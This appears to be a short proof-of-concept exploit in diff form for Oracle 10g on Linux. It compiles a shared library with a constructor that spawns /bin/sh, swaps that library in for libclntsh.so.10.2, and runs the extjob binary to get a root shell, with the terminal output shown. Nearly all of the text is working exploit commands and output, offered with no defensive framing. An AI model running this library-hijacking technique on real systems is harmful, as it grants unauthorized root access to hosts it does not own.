@@ -1,0 +1,22 @@
+-- Example with libclntsh.so
+
+$ cat test.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+
+void __attribute__ ((constructor)) my_init(void)
+{
+	printf("[+] It works! Root shell...\n");
+        system("/bin/sh");
+}
+
+$ cc test.c -fPIC -o test.so -shared
+$
+mv /home/joxean/oracle10g/product/10.2.0/db_2/lib/libclntsh.so.10.2 /home/joxean/oracle10g/product/10.2.0/db_2/lib/.libclntsh.so.10.2
+$ mv
+test.so /home/joxean/oracle10g/product/10.2.0/db_2/lib/libclntsh.so.10.2
+$ $ORACLE_HOME/bin/extjob
+[+] It works! Root shell...
+sh-3.1#
